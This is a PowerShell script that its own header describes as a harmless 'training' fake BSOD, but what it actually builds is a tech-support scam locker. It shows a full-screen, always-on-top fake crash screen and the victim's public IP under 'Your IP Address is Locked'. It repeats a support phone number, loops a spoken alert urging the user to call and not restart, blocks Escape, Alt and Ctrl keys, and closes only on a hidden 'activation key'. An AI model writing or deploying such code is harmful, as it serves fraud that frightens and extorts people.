function Show-BSODDemo {
<#
.SYNOPSIS

Shows a clearly labelled, non-destructive fake BSOD training screen.

.DESCRIPTION

Displays a full-screen mock Windows Blue Screen of Death.
It never crashes the machine and cannot be dismissed with Escape.

.EXAMPLE

PS> . .\run.ps1
PS> Show-BSODDemo

#>
	Add-Type -AssemblyName System.Windows.Forms
	Add-Type -AssemblyName System.Drawing
	Add-Type -AssemblyName System.Speech -ErrorAction SilentlyContinue

	$form = New-Object System.Windows.Forms.Form
	$form.Text = 'BSOD Simulation'
	$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
	$form.ForeColor = [System.Drawing.Color]::White
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
	$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
	$form.TopMost = $true
	$form.KeyPreview = $true
	$form.ShowInTaskbar = $false
	$form.ControlBox = $false
	$form.MinimizeBox = $false
	$form.MaximizeBox = $false
	$form.Cursor = [System.Windows.Forms.Cursors]::Default
	$form.Location = New-Object System.Drawing.Point(0, 0)
	$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
	$form.MinimumSize = $form.Size
	$form.MaximumSize = $form.Size
	$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
	$form.ShowIcon = $false
	$form.Opacity = 1.0
	$form.TopMost = $true
	$form.Activate()
	$userIP = "Unknown IP"
	try {
		$userIP = (Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 3).Trim()
	} catch {
		$userIP = "192.168.1.100"
	}

	$ipLabel = New-Object System.Windows.Forms.Label
	$ipLabel.Text = "Warning: Your IP Address is Locked : $userIP"
	$ipLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 24, [System.Drawing.FontStyle]::Regular)
	$ipLabel.ForeColor = [System.Drawing.Color]::Red
	$ipLabel.AutoSize = $true
	$ipLabel.Location = New-Object System.Drawing.Point(120, 20)
	$ipLabel.BackColor = $form.BackColor
	$form.Controls.Add($ipLabel)

	$contactLabel = New-Object System.Windows.Forms.Label
	$contactLabel.Text = "Contact Support: +1-(507)-291-5455"
	$contactLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 24, [System.Drawing.FontStyle]::Regular)
	$contactLabel.ForeColor = [System.Drawing.Color]::Red
	$contactLabel.AutoSize = $true
	$contactLabel.Location = New-Object System.Drawing.Point(120, 65)
	$contactLabel.BackColor = $form.BackColor
	$form.Controls.Add($contactLabel)
	$mainText = "Your PC ran into a problem and needs to restart.`r`nWe'll restart for you."

	$bsodFace = New-Object System.Windows.Forms.Label
	$bsodFace.Text = ':('
	$bsodFace.Font = New-Object System.Drawing.Font('Segoe UI Light', 100, [System.Drawing.FontStyle]::Regular)
	$bsodFace.ForeColor = [System.Drawing.Color]::White
	$bsodFace.AutoSize = $true
	$bsodFace.Location = New-Object System.Drawing.Point(120, 120)
	$bsodFace.BackColor = $form.BackColor
	$form.Controls.Add($bsodFace)

	$mainMessage = New-Object System.Windows.Forms.Label
	$mainMessage.AutoSize = $true
	$mainMessage.Font = New-Object System.Drawing.Font('Segoe UI Light', 22, [System.Drawing.FontStyle]::Regular)
	$mainMessage.Location = New-Object System.Drawing.Point(120, 385)
	$mainMessage.Text = $mainText
	$mainMessage.ForeColor = [System.Drawing.Color]::White
	$mainMessage.BackColor = $form.BackColor
	$form.Controls.Add($mainMessage)

	$progressLabel = New-Object System.Windows.Forms.Label
	$progressLabel.Text = ''
	$progressLabel.Visible = $false
	$form.Controls.Add($progressLabel)

	$qrBox = New-Object System.Windows.Forms.PictureBox
	$qrBox.Size = New-Object System.Drawing.Size(110, 110)
	$qrBox.Location = New-Object System.Drawing.Point(120, 555)
	$qrBox.BackColor = [System.Drawing.Color]::White
	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
	$form.Controls.Add($qrBox)

	$qrClient = New-Object System.Net.WebClient
	$qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=110x110&margin=0&data=https%3A%2F%2Fwww.windows.com%2Fstopcode'
	try {
		$qrBytes = $qrClient.DownloadData($qrUrl)
		$qrStream = New-Object System.IO.MemoryStream($qrBytes, $false)
		$qrBox.Image = [System.Drawing.Image]::FromStream($qrStream)
	} catch {
		$qrBox.BackColor = [System.Drawing.Color]::White
	}

	$qrText = New-Object System.Windows.Forms.Label
	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +1-507-291-5455"
	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
	$qrText.ForeColor = [System.Drawing.Color]::White
	$qrText.AutoSize = $true
	$qrText.Location = New-Object System.Drawing.Point(245, 560)
	$form.Controls.Add($qrText)

	# Vertical progress bar hidden - not in reference
	$progressBar = New-Object System.Windows.Forms.Label
	$progressBar.Visible = $false
	$form.Controls.Add($progressBar)

	$playBtn = New-Object System.Windows.Forms.Button
	$playBtn.Size = New-Object System.Drawing.Size(0, 0)
	$playBtn.Visible = $false
	$playBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
	$playBtn.BackColor = $form.BackColor
	$form.Controls.Add($playBtn)

	$script:browserOverride = $false
	$script:browserOverrideDelay = $false

	$popup = New-Object System.Windows.Forms.Panel
	$screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
	$popupWidth = 460
	$popupHeight = 230
	# Right half ka center - content left 55% tak hai, right 45% khali hai
	$rightAreaStart = [int]($screenBounds.Width * 0.57)
	$rightAreaWidth = $screenBounds.Width - $rightAreaStart
	$popupX = $rightAreaStart + [int](($rightAreaWidth - $popupWidth) / 2)
	$popupY = $screenBounds.Height - $popupHeight - 120
	$popup.Location = New-Object System.Drawing.Point($popupX, $popupY)
	$popup.Size = New-Object System.Drawing.Size($popupWidth, $popupHeight)
	$popup.BackColor = [System.Drawing.Color]::FromArgb(238, 238, 238)
	$popup.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$popup.ForeColor = [System.Drawing.Color]::Black
	$popup.Visible = $true
	$form.Controls.Add($popup)
	$popup.BringToFront()
	$popup.Focus()

	$browserMonitorTimer = New-Object System.Windows.Forms.Timer
	$browserMonitorTimer.Interval = 500
	$browserMonitorTimer.Add_Tick({
		if ($script:browserOverrideDelay) {
			$form.TopMost = $true
			$form.Activate()
			$popup.BringToFront()
			return
		}

		$browserNames = @('chrome', 'msedge', 'firefox', 'iexplore', 'opera', 'brave')
		$browserRunning = $false
		foreach ($browserName in $browserNames) {
			try {
				$proc = Get-Process -Name $browserName -ErrorAction Stop
				if ($proc) {
					$browserRunning = $true
					break
				}
			} catch {
			}
		}

		if ($browserRunning) {
			$form.TopMost = $false
			$popup.SendToBack()
			$popup.Visible = $true
		} else {
			$form.TopMost = $true
			$popup.BringToFront()
			$popup.Visible = $true
		}
	})
	$browserMonitorTimer.Start()

	$browserTimer = New-Object System.Windows.Forms.Timer
	$browserTimer.Interval = 300000
	$browserTimer.Add_Tick({
		$script:browserOverrideDelay = $true
		$popup.Visible = $false
		$form.TopMost = $true
		$form.Activate()
		$form.BringToFront()
		$browserTimer.Stop()
	})
	$browserTimer.Start()

	$popupTitle = New-Object System.Windows.Forms.Label
	$popupTitle.Text = ''
	$popupTitle.Font = New-Object System.Drawing.Font('Segoe UI', 18)
	$popupTitle.ForeColor = [System.Drawing.Color]::Black
	$popupTitle.AutoSize = $true
	$popupTitle.Location = New-Object System.Drawing.Point(25, 20)
	$popupTitle.Visible = $false
	$popup.Controls.Add($popupTitle)

	$popupText = New-Object System.Windows.Forms.Label
	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +1-507-291-5455"
	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
	$popupText.BackColor = $popup.BackColor
	$popupText.AutoSize = $true
	$popupText.Location = New-Object System.Drawing.Point(15, 15)
	$popup.Controls.Add($popupText)

	$validActivationCode = '12345-67890'
	$validActivationCodeNormalized = ($validActivationCode -replace '[^0-9]', '')
	$errorLabel = New-Object System.Windows.Forms.Label
	$errorLabel.Text = ''
	$errorLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 0, 0)
	$errorLabel.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
	$errorLabel.AutoSize = $true
	$errorLabel.Location = New-Object System.Drawing.Point(15, 150)
	$errorLabel.Visible = $false
	$popup.Controls.Add($errorLabel)

	$keyInput = New-Object System.Windows.Forms.TextBox
	$keyInput.Width = 400
	$keyInput.Height = 30
	$keyInput.Font = New-Object System.Drawing.Font('Segoe UI', 13)
	$keyInput.Location = New-Object System.Drawing.Point(15, 88)
	$keyInput.BackColor = [System.Drawing.Color]::White
	$keyInput.ForeColor = [System.Drawing.Color]::Black
	$keyInput.MaxLength = 15
	$keyInput.CharacterCasing = [System.Windows.Forms.CharacterCasing]::Upper
	$keyInput.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
	$keyInput.Add_TextChanged({
		$raw = ($keyInput.Text -replace '[^0-9]', '')
		$parts = @()
		for ($i = 0; $i -lt $raw.Length; $i += 5) {
			$parts += $raw.Substring($i, [Math]::Min(5, $raw.Length - $i))
		}
		$formatted = ($parts -join '-')
		if ($keyInput.Text -ne $formatted) {
			$keyInput.Text = $formatted
			$keyInput.SelectionStart = $keyInput.Text.Length
		}
	})
	$keyInput.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
			$entered = ($keyInput.Text -replace '[^0-9]', '')
			if ($entered -eq $validActivationCodeNormalized) {
				$popup.Visible = $false
				$errorLabel.Visible = $false
				$form.Close()
			} else {
				$errorLabel.Text = 'Invalid activation code. Please try again.'
				$errorLabel.Visible = $true
				$keyInput.Focus()
				$keyInput.SelectAll()
			}
		}
	})
	$popup.Controls.Add($keyInput)

	$validateActivation = {
		$entered = ($keyInput.Text -replace '[^0-9]', '')
		if ($entered -eq $validActivationCodeNormalized) {
			$popup.Visible = $false
			$errorLabel.Visible = $false
			$form.Close()
		} else {
			$errorLabel.Text = 'Invalid activation code. Please try again.'
			$errorLabel.Visible = $true
			$keyInput.Focus()
			$keyInput.SelectAll()
		}
	}

	$okBtn = New-Object System.Windows.Forms.Button
	$okBtn.Text = 'OK'
	$okBtn.Width = 75
	$okBtn.Height = 30
	$okBtn.Font = New-Object System.Drawing.Font('Segoe UI', 11)
	$okBtn.Location = New-Object System.Drawing.Point(230, 175)
	$okBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$okBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$okBtn.Add_Click($validateActivation)
	$popup.Controls.Add($okBtn)

	$cancelBtn = New-Object System.Windows.Forms.Button
	$cancelBtn.Text = 'Cancel'
	$cancelBtn.Width = 80
	$cancelBtn.Height = 30
	$cancelBtn.Font = New-Object System.Drawing.Font('Segoe UI', 11)
	$cancelBtn.Location = New-Object System.Drawing.Point(320, 175)
	$cancelBtn.BackColor = [System.Drawing.Color]::FromArgb(245, 245, 245)
	$cancelBtn.FlatStyle = [System.Windows.Forms.FlatStyle]::Standard
	$cancelBtn.Add_Click({
		$keyInput.Text = ''
		$errorLabel.Visible = $false
		$keyInput.Focus()
	})
	$popup.Controls.Add($cancelBtn)

	$bottomText = New-Object System.Windows.Forms.Label
	$bottomText.Text = ""
	$bottomText.Visible = $false
	$form.Controls.Add($bottomText)

	$script:tts = $null
	$script:ttsEnabled = $false
	$script:audioFallbackTimer = $null

	$spokenText = "Critical Alert. Warning, Your IP Address is Locked. Please contact support immediately at 1 5 0 7, 2 9 1, 5 4 5 5. Do not restart your computer."
	try {
		$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
		$installedVoices = $synth.GetInstalledVoices()

		if ($installedVoices -and $installedVoices.Count -gt 0) {
			$firstVoice = $installedVoices[0].VoiceInfo
			if ($firstVoice -and $firstVoice.Name) {
				$synth.SelectVoice($firstVoice.Name)
				$synth.Volume = 100
				$synth.Rate = 0
				$script:tts = $synth
				$script:ttsEnabled = $true
				$script:tts.SpeakCompleted += {
					if ($script:ttsEnabled -and $script:tts -ne $null) {
						$script:tts.SpeakAsync($spokenText)
					}
				}
				$script:tts.SpeakAsync($spokenText) | Out-Null
			}
		}
	} catch {
		$script:tts = $null
		$script:ttsEnabled = $false
	}

	if (-not $script:ttsEnabled) {
		try {
			[System.Media.SystemSounds]::Exclamation.Play()
			[System.Media.SystemSounds]::Asterisk.Play()
		} catch {
		}

		$script:audioFallbackTimer = New-Object System.Windows.Forms.Timer
		$script:audioFallbackTimer.Interval = 2500
		$script:audioFallbackTimer.Add_Tick({
			try {
				[System.Media.SystemSounds]::Exclamation.Play()
			} catch {
			}
			$script:audioFallbackTimer.Stop()
		})
		$script:audioFallbackTimer.Start()
	}

	$form.Add_KeyDown({
		if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
			$_.SuppressKeyPress = $true
		}
		if ($_.Alt -or $_.Control) {
			$_.SuppressKeyPress = $true
		}
	})

	$form.Add_Activated({
		$form.Location = New-Object System.Drawing.Point(0, 0)
		$form.Size = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
		$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
	})

	$form.Add_Shown({
		$form.TopMost = $true
		$popup.Visible = $true
		$popup.BringToFront()
		if ($keyInput -ne $null) {
			$keyInput.Focus()
		}
	})

	$form.Add_FormClosing({
		if ($script:tts -ne $null) {
			$script:ttsEnabled = $false
			$script:tts.Dispose()
			$script:tts = $null
		}
	})

	[void]$form.ShowDialog()

	if ($script:tts -ne $null) {
		$script:ttsEnabled = $false
		$script:tts.Dispose()
		$script:tts = $null
	}
}

if ($MyInvocation.InvocationName -ne '.') {
	Show-BSODDemo
}
